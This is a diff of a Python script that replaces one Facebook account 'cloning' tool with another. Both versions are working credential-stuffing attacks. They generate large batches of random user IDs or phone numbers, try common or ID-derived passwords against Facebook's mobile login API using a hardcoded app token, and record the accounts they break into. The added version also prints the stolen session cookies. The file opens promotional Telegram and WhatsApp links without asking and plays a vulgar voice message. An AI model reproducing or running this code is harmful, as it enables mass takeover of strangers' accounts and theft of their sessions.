@@ -1,423 +1,140 @@
-"""
-    @ code by ---( Shani john )---
-    @ Github : https://github.com/shani723327
-    @ WhatsApp : https://wa.me/+923200795589
-    
-"""
-import requests,bs4,json,uuid,os,sys,random,datetime,time,re,urllib3,base64,string,platform,httpx,mechanize,rich,json,subprocess
-try:
-	from time import sleep
-	from bs4 import BeautifulSoup as sop
-	from datetime import datetime
-	from random import randint as rr
-	from random import choice as rc
-	from string import digits as digits
-	from os import system as cmd
-	from concurrent.futures import ThreadPoolExecutor as ShaniXD 
-except ModuleNotFoundError:
-	os.system('pip install rich')
-	os.system('pip install requests')
-	os.system('pip install bs4')
-sys.stdout.write('\x1b]2; ⏤͟͟͞͞ ⍣⃝😈𝗦𝗛𝗔𝗡𝗜🫀❤️‍🩹⍣⃝😈 ͟͞⏤ 𝗥𝗦🥰\x07')
+#===== SC DAVLOPER : ржЬрж╛ржЙрж░рж╛ ZUYAN ЁЯдгтШ║я╕П
+
+#====== SC SEND BY > KALYAN KING
+
+#====== TEAM : KGF CYBER TEAM
 import os
-import uuid
+try:
+    import requests,rich,bs4,fake_useragent
+except:
+    os.system('pip install requests && pip install rich')
+from rich import print
+from rich.console import Console
+from rich.panel import Panel
+from concurrent.futures import ThreadPoolExecutor as tred
 import requests
-from datetime import datetime
-import urllib.parse
+import random
+import string
+import uuid
+import time
+import sys
+import re
+#-----------------------#
+R="[bold red]"
+G="[bold green]"
+Y="[bold yellow]"
+B="[bold blue]"
+M="[bold magenta]"
+P="[bold violet]"
+C="[bold cyan]"
+W="[bold white]"
+r="\033[1;31m"
+g="\033[1;32m"
+y="\033[1;33m"
+b="\033[1;34m"
+m="\033[1;35m"
+c="\033[1;36m"
+w="\033[1;37m"
+X = "[bold green]<[bold white]+[bold green]>[bold white]"
+os.system('espeak -v bn+f3 -a 120 -p 40 -s 100 "ржмрзЛржХрж╛ржЪрзЛржжрж╛ ржЬрзБрзЯрж╛ржи Script Wlacme рждрзЛржорж╛ржжрзЗрж░ ржХрж▓рзНржпрж╛ржи ржнрж╛ржЗ ржПржЗ Script ржЯрж╛ ржжрж┐ржЪрзНржЫрзЗ рждрзЛржорж╛рж░рж╛ ржЖржмрж╛рж░ ржЬрзБрзЯрж╛ржи ржмрзЛржХрж╛ржЪрзЛржжрзЗржХрзЗ ржмрж▓ржмрж╛ ржирж╛ ржПржЯрж╛ ржоржЬрж╛ ржХрж░рзЛ"')
+#-----------------------#
+logo = Panel(f"""
+{X} CREATOR   : [bold green]MR ZUYAN  
+{X} FRAMEWORK : [bold yellow]XVSOULX - ELITE  
+{X} FACEBOOK  : [bold magenta]MR ZUYAN & ZUYANx  
+{X} SECURITY  : [bold red]AI-POWERED SHIELD  
+{X} SCRIPT SEND     : [bold blue]KALYAN KING
+{X} TRUSTED   : [bold cyan]ELITE DEVELOPERS""",
+title="[bold yellow]тЪб XVSOULX тЪб[/bold yellow]",
+border_style="green1")
+#-----------------------#
+def clear():
+    os.system("xdg-open https://t.me/KGF_WORLD_CYBER")
+    os.system('clear')
+#-----------------------#
+def linex():
+    print(f"{W}тАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФ")
+#-----------------------#
+live = 0
+cp = 0
+loop = 0
+numx = []
+console = Console()
+#-----------------------#
+def ugenX():
+    android_version = random.randint(10, 13)  # Random Android version
+    build_number = f"QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}"
+    # Fixed device details from your provided UA
+    density = 2.75
+    width, height = 1080, 2220  
+    # Random Facebook app version and build version
+    fb_versions = [
+        ("335.0.0.28.118", "316527966", "317757053"),
+        ("347.0.0.3.161", "229145646", "318734599"),
+        ("350.0.0.8.89", "318734599", "320456789")
+    ]
+    fb_version, fb_build, fb_rv = random.choice(fb_versions)
+    # Generate User-Agent
+    user_agent = (
+        f"Mozilla/5.0 (Linux; Android {android_version}; Build/{build_number}) "
+        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.0.0 Mobile Safari/537.36 "
+        f"[FBAN/FB4A;FBAV/{fb_version};FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/{fb_build};"
+        f"FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/{android_version};"
+        f"FBCA/armeabi-v7a:armeabi;FBDM/{{density={density},width={width},height={height}}};"
+        f"FB_FW/1;FBRV/{fb_rv};]"
+    )
+    return user_agent
 
-# ================= CONFIG =================
-APPROVED_URL = "https://raw.githubusercontent.com/Shani5589/SHAN/main/keys.txt"
-KEY_FILE = "device_key.txt"
-ADMIN_NUMBER = "923200795589"
-
-# ================= DEVICE KEY =================
-def get_or_create_key():
-    if os.path.exists(KEY_FILE):
-        with open(KEY_FILE, "r") as f:
-            return f.read().strip()
-
-    key = str(uuid.uuid4())
-    with open(KEY_FILE, "w") as f:
-        f.write(key)
-
-    return key
-
-# ================= APPROVAL CHECK =================
-def check_key(key):
-    try:
-        data = requests.get(APPROVED_URL).text.splitlines()
-        today = datetime.today()
-
-        for line in data:
-            line = line.strip()
-
-            if "|" not in line:
-                continue
-
-            saved_key, exp_date = line.split("|")
-
-            saved_key = saved_key.strip()
-            exp_date = exp_date.strip()
-
-            if saved_key == key:
-                try:
-                    exp = datetime.strptime(exp_date, "%d-%m-%Y")
-                except:
-                    return "not", None
-
-                if today <= exp:
-                    return "approved", exp_date
-                else:
-                    return "expired", exp_date
-
-        return "not", None
-
-    except:
-        return "not", None
-
-# ================= WHATSAPP =================
-def send_whatsapp(key, status, exp=None):
-
-    if status == "approved":
-        return  # no WhatsApp for approved
-
-    if status == "expired":
-        message = f"""Hi Admin 👋
-My key is EXPIRED.
-
-Key: {key}
-Expiry: {exp}
-"""
-    else:
-        message = f"""Hi Admin 👋
-My key is NOT APPROVED.
-
-Key: {key}
-"""
-
-    encoded = urllib.parse.quote(message)
-    url = f"whatsapp://send?phone={ADMIN_NUMBER}&text={encoded}"
-
-    os.system(f'am start -a android.intent.action.VIEW -d "{url}"')
-
-# ================= MAIN SYSTEM =================
-
-key = get_or_create_key()
-
-# FORCE CLEAN STATE (important fix for repeat bug)
-key = key.strip()
-
-status, exp = check_key(key)
-
-# DEBUG (optional)
-print("DEBUG KEY:", key)
-print("DEBUG STATUS:", status)
-
-# ================= FLOW CONTROL =================
-
-if status == "approved":
-
-    print("\n✅ APPROVED DEVICE")
-    print("🚀 Module running directly...\n")
-
-    # SHOW CORRECT KEY (FIXED ISSUE)
-    print("🔑 Device Key:", key)
-    print("📅 Expiry Date:", exp)
-
-    # yahan apna main module run karo
-    # run_module()
-
-else:
-
-    print("\n❌ ACCESS BLOCKED")
-    print("🔑 Device Key:", key)
-
-    send_whatsapp(key, status, exp)
-    exit()
-def ___uax___():
-    aV=str(random.choice(range(10,20)))
-    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
-    bV=str(random.choice(range(1,36)))
-    bx=str(random.choice(range(34,38)))
-    bz=f"5{bx}.{bV}"
-    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
-    cV=str(random.choice(range(1,36)))
-    cx=str(random.choice(range(34,38)))
-    cz=f"5{cx}.{cV}"
-    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
-    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
-    return random.choice([A,B,C,D])
-os.system('xdg-open https://wa.me/+923200795589')
-
-##-------------(Basic colors)-------------------
-yellow = "\033[1;33m"
-black = "\033[1;90m"
-red = "\033[1;91m"
-green = "\033[1;32m"
-blue = "\033[1;34m"
-purple = "\033[1;35m"
-cyan = "\033[1;36m"
-r_cyan = "\033[38;5;122m"
-r_purple = "\033[38;5;147m"
-r_green = "\033[38;5;112m"
-white = "\033[0;97m"
-reset = '\x1b[0m'
-pink = "\x1b[38;5;205m"
-brown = "\x1b[38;5;208m"
-colors = [
-    "\033[0;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m",
-    "\033[0;92m", "\033[1;92m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m",
-    "\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m",
-    "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m",
-    "\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m",
-    "\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m",
-    "\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m", "\033[0;104m", "\033[1;104m",
-    "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"
-]
-key, expiry = check_approval()
-#---------------------------| Loop |---------------------------#
-id,id2,loop,ok,cp=[],[],0,0,0;user=[];total_hits = 0
-#---------------------------| Linex |---------------------------#
-def clear():os.system('clear');print(logo)
-def linex():print(f'{black}⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯{white}')
-#---------------------------| Logo |---------------------------#
-logo=(f'''\033[1;92m███████╗██╗  ██╗ █████╗ ███╗   ██╗██╗
-██╔════╝██║  ██║██╔══██╗████╗  ██║██║
-███████╗███████║███████║██╔██╗ ██║██║
-╚════██║██╔══██║██╔══██║██║╚██╗██║██║
-███████║██║  ██║██║  ██║██║ ╚████║██║
-╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝
-                                     \033[0m
-\033[1;90m{15 * '⎯⎯⎯'}
-\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m Tool Owner  \033[1;90m➤\033[1;97m  SHANI MALIK 💗😻
-\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m WhatsApp    \033[1;90m➤\033[1;97m  +923200795589
-\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m Tool Type     \033[1;90m➤\033[1;97m  PREMIUM PAID TOOL🔥
-\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m Device Key   \033[1;90m➤\033[1;97m         {key}
-\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m Expiry Date   \033[1;90m➤\033[1;97m       {expiry}
-\x1b[1;90m{15 * '⎯⎯⎯'}''')
-import hashlib
-import platform
-from datetime import datetime
+# Example Usage
 
 
-# -------- FIXED DEVICE KEY (NO RANDOM) --------
-def get_device_key():
-    raw = platform.node() + platform.machine() + platform.system()
-    return hashlib.sha256(raw.encode()).hexdigest()[:10]
-
-
-# -------- APPROVAL + EXPIRY CHECK --------
-def approval_system():
-    try:
-        device_key = get_device_key()
-
-        with open("Shani.txt", "r") as f:
-            lines = f.read().splitlines()
-
-        today = datetime.today().date()
-
-        print("Checking approval...")
-
-        for line in lines:
-            data = line.split("|")
-
-            # FORMAT: key|expiry
-            if len(data) != 2:
-                continue
-
-            key, expiry = data[0], data[1]
-
-            expiry_date = datetime.strptime(expiry, "%Y-%m-%d").date()
-
-            # MATCH DEVICE KEY
-            if device_key == key:
-                if today <= expiry_date:
-                    print("\nApproved ✅ Access Granted (Active)\n")
-                    return True
-                else:
-                    print("\nKey Expired ❌ Contact Admin\n")
-                    exit()
-
-        # IF NOT FOUND
-        print("\nNot Approved ❌")
-        print("Your Key:", device_key)
-        print("Send this key to Admin for approval\n")
-        exit()
-
-    except FileNotFoundError:
-        print("Shani.txt missing ❌")
-        exit()
-
-
-# -------- RUN SYSTEM --------
-approval_system()
-# -------------(CHECK ID CREATION YEAR)--------------
-def creationyear(uid):
-    if len(uid) == 15:
-        if uid[:10] in ['1000000000']:
-            Shani_dgk = '2009'
-        elif uid[:9] in ['100000000']:
-            Shani_dgk = '2009'
-        elif uid[:8] in ['10000000']:
-            Shani_dgk = '2009'
-        elif uid[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
-            Shani_dgk = '2009'
-        elif uid[:7] in ['1000006', '1000007', '1000008', '1000009']:
-            Shani_dgk = '2010'
-        elif uid[:6] in ['100001']:
-            Shani_dgk = '2010'
-        elif uid[:6] in ['100002', '100003']:
-            Shani_dgk = '2011'
-        elif uid[:6] in ['100004']:
-            Shani_dgk = '2012'
-        elif uid[:6] in ['100005', '100006']:
-            Shani_dgk = '2013'
-        elif uid[:6] in ['100007', '100008']:
-            Shani_dgk = '2014'
-        elif uid[:6] in ['100009']:
-            Shani_dgk = '2015'
-        elif uid[:5] in ['10001']:
-            Shani_dgk = '2016'
-        elif uid[:5] in ['10002']:
-            Shani_dgk = '2017'
-        elif uid[:5] in ['10003']:
-            Shani_dgk = '2018'
-        elif uid[:5] in ['10004']:
-            Shani_dgk = '2019'
-        elif uid[:5] in ['10005']:
-            Shani_dgk = '2020'
-        elif uid[:5] in ['10006']:
-            Shani_dgk = '2021'
-        elif uid[:5] in ['10009']:
-            Shani_dgk = '2023'
-        elif uid[:5] in ['10007', '10008']:
-            Shani_dgk = '2022'
-        else:
-            Shani_dgk = ''
-    elif len(uid) in [9, 10]:
-        Shani_dgk = '2008'
-    elif len(uid) == 8:
-        Shani_dgk = '2007'
-    elif len(uid) == 7:
-        Shani_dgk = '2006'
-    elif len(uid) == 14 and uid[:2] in ['61']:
-        Shani_dgk = '2024'
-    else:
-        Shani_dgk = ''
-    return Shani_dgk
-        	
-#---------------------------[ MAIN MENU ]---------------------------#
-def WEHSHI________():
+def main():
     clear()
-    print(f"\033[1;90m[\033[1;97m1\033[1;90m]\033[0;97m 2010 - 2012")
-    print(f"\033[1;90m[\033[1;97m2\033[1;90m]\033[0;97m 2009 - 2010")
-    print(f"\033[1;90m[\033[1;97m3\033[1;90m]\033[0;97m 2011 - 2014")
-    print(f"\x1b[1;90m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\033[0;97m") 
-    option = input(f"\033[1;90m[\033[1;97m?\033[1;90m]\033[0;97m Enter Your Choice: ")
-    if option == "1":os.system('xdg-open https://www.facebook.com/Wehshi11');__2010___2011()
-    elif option == "2":os.system('xdg-open https://www.facebook.com/Wehshi11');____old2009___()
-    elif option == "3":os.system('xdg-open https://www.facebook.com/Wehshi11');_____old2011_____()
-    else:
-        print(f"{red}[!] Invalid choice..."); WEHSHI________()
-
-
-#---------------------------[ 2010-2011 CLONING ]---------------------------#
-
-def __2010___2011():
-    user = []
+    console.print(logo)
+    console.print(Panel("017/018/019/016", style="bold green1"))
+    # Custom bottom-styled input
+    console.print("тХнтФАтФА(тЪбXVSOULXтЪб)")
+    code = console.input("тХ░тФАтФАтФАтФА> ")
     clear()
-    print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m For Example : 50000 | 100000 | 200000 | 300000")
-    linex()
-    limit = int(input(f'\033[1;97m Put Limit :\033[1;92m '))
-    for i in range(int(limit)):
-        data = random.choice(["100001","100002","100003","100004"])+str(random.choice(range(111111111, 999999999)))
-        user.append(data)
-    with ShaniXD(max_workers=50) as Shani:
-        tl = str(limit)
+    console.print(logo)
+    console.print(Panel('1000/2000/50000',style="bold green1"))
+    console.print("тХнтФАтФА(тЪбXVSOULXтЪб)")
+    limit = int(console.input("тХ░тФАтФАтФАтФА> "))
+    for _ in range(limit):
+        num = ''.join(random.choice(string.digits) for _ in range(8))
+        numx.append(num)
+    with tred(max_workers=30) as ZUYAN:
         clear()
-        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{tl}")
-        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m USE 1.1.1.1 VPN FOR BEST RESULT")
-        linex()
-        for mal in user:
-            uid = mal
-            pas = ['123456', '1234567', '12345678', '123456789']
-            Shani.submit(____old____, uid, pas, tl)
-    print('');linex();print(f"\n{green} Cloning Session Complete")
-    print(f"{white}➤ Total OK: {green}{len(ok)}")
-    print(f"{white}➤ Total CP: {red}{len(cp)}")
-    linex()
-    exit()
-    
-#---------------------------[ 2009-2010 CLONING ]---------------------------#
-def ____old2009___():
-    clear()
-    print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m For Example : 50000 | 100000 | 200000 | 300000")
-    linex()
-    limit = int(input(f'\033[1;97m Put Limit :\033[1;92m '))
-    for _ in range(int(limit)):
-        nmp = ''.join(random.choice(digits) for _ in range(9))
-        user.append(nmp)
+        console.print(logo)
+        console.print(Panel(f"{X} CODE : {code}\n{X} LIMIT : {limit}\n{X} CRACKING WITH ZUYAN"))
+        for sex in numx:
+            uid = code+sex
+            pwx = [sex,uid,uid[:6],uid[:7],uid[:8],uid[5:]]
+            ZUYAN.submit(crack,uid,pwx)
 
-    with ShaniXD(max_workers=50) as Shani:
-        clear()
-        tl = str(len(user))
-        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{tl}")
-        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m USE 1.1.1.1 VPN FOR BEST RESULT")
-        linex()
-        for love in user:
-            uid = "100000" + love
-            pas = ['123456', '1234567', '12345678', '123456789']
-            Shani.submit(____old____, uid, pas, tl)
-
-    print('');linex();print(f"\n{green} Cloning Session Complete")
-    print(f"{white}➤ Total OK: {green}{len(ok)}")
-    print(f"{white}➤ Total CP: {red}{len(cp)}")
-    linex()
-    exit()
-
-#---------------------------[ 2011-2014 CLONING ]---------------------------#
-def _____old2011_____():
-    clear()
-    print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m For Example : 50000 | 100000 | 200000 | 300000")
-    linex()
-    limit = int(input(f'\033[1;97m Put Limit :\033[1;92m '))
-    for _ in range(int(limit)):
-        nmp = ''.join(random.choice(digits) for _ in range(10))
-        user.append(nmp)
-    with ShaniXD(max_workers=50) as Shani:
-        clear()
-        tl = str(len(user))
-        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{tl}")
-        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m USE 1.1.1.1 VPN FOR BEST RESULT")
-        linex()
-        for love in user:
-            uid = "10000" + love
-            pas = ['123456', '1234567', '12345678', '123456789']
-            Shani.submit(____old____, uid, pas, tl)
-
-    print('');linex();print(f"\n{green} Cloning Session Complete")
-    print(f"{white}➤ Total OK: {green}{len(ok)}")
-    print(f"{white}➤ Total CP: {red}{len(cp)}")
-    linex()
-    exit()
-def ____old____(uid,pas,tl):
-    global loop,ok,total_hits
-    sys.stdout.write(f"\r\033[0m[\033[1;92m𝗦𝗛𝗔𝗡𝗜~𝗕𝗢𝗦𝗦🔥\033[0m] \033[0;93m{loop}\033[0m/\033[1;91m{tl} \033[1;97m[\033[1;92mOK-{ok}\033[1;97m]")
+def crack(uid,pwx):
+    global live,loop
     try:
-        for ps in pas:
-            with requests.Session() as session:
-                headers={'x-fb-connection-bandwidth': str(rr(20000000,29999999)),'x-fb-sim-hni': str(rr(20000,40000)),'x-fb-net-hni': str(rr(20000,40000)),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent': ___uax___(),'content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
-            po=session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(ps)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers).json()
-            if "Please Confirm Email" in str(po):
-                print(f"\r\033[1;92m[Shani-OK💚] {uid} ● {ps}\033[1;97m ● \033[1;92m{creationyear(uid)}")
-                open("/sdcard/OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"|"+creationyear(uid)+"\n");ok+=1
-                break
-            elif "session_key" in po:
-                print(f"\r\033[1;92m[Shani-OK💚] {uid} ● {ps}\033[1;97m ● \033[1;92m{creationyear(uid)}")
-                open("/sdcard/OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"|"+creationyear(uid)+"\n");ok+=1
-                break
-            else:pass
+        for pw in pwx:
+            sys.stdout.write(f'\r{w}[{b}тЮд{w}] {y}CRACKING {w}[{g}{loop}{w}]<>[ALIVE:{g}{live}{w}]\r')
+            sys.stdout.flush()
+            data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': uid,'password': pw,'generate_analytics_claims': '1', 'community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
+            headers = {'User-Agent': ugenX(),'Accept-Encoding':  'gzip, deflate','Accept': '*/*', 'Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
+            url = 'https://b-graph.facebook.com/auth/login'
+            try:
+                response = requests.post(url,data=data,headers=headers,allow_redirects=False).json()
+                if 'session_key' in response:
+                    coki = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
+                    console.print(Panel(f"[bold green1]{uid} | {pw}\n[bold green1]cookies : {coki}"))
+                    live+=1
+                    break
+                elif 'www.facebook.com' in response['error']['message']:
+                    console.print(Panel(f"[bold yellow]{uid} | {pw}"))
+                    break
+            except Exception as e:
+                pass
         loop+=1
-    except Exception as e:pass
+    except Exception as e:
+        pass
 
-WEHSHI________()
+main()
